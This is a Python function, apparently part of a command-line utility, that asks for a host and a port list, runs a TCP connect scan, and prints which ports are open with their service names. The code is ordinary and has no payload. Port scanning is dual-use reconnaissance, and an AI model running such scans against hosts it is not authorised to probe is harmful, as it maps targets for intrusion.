def cmd_port_scan(ctx):
    """TCP connect scan of a host."""
    host = ctx["ask"]("Host to scan", "127.0.0.1")
    spec = ctx["ask"]("Ports (e.g. 22,80,443 or 1-1024)", "22,80,443,8080")
    if not host:
        return
    ports: List[int] = []
    for chunk in re.split(r"[\s,]+", spec.strip()):
        if not chunk:
            continue
        if "-" in chunk:
            try:
                lo, hi = chunk.split("-", 1)
                ports.extend(range(int(lo), int(hi) + 1))
            except ValueError:
                continue
        else:
            try:
                ports.append(int(chunk))
            except ValueError:
                continue
    ports = sorted(set(p for p in ports if 0 < p < 65536))
    if not ports:
        ctx["console"].print(f"[{ctx['theme'].warning}]No valid ports.[/]")
        return
    ctx["console"].print(f"[{ctx['theme'].info}]Scanning {len(ports)} ports on {host} ...[/]")
    rows = []
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.6)
                code = sock.connect_ex((host, port))
                open_ = code == 0
        except OSError as exc:
            rows.append((port, "error", str(exc)))
            continue
        try:
            service = socket.getservbyport(port, "tcp")
        except OSError:
            service = ""
        rows.append((port, "OPEN" if open_ else "closed", service))
    _print_table(ctx, rows, ("Port", "Status", "Service"))


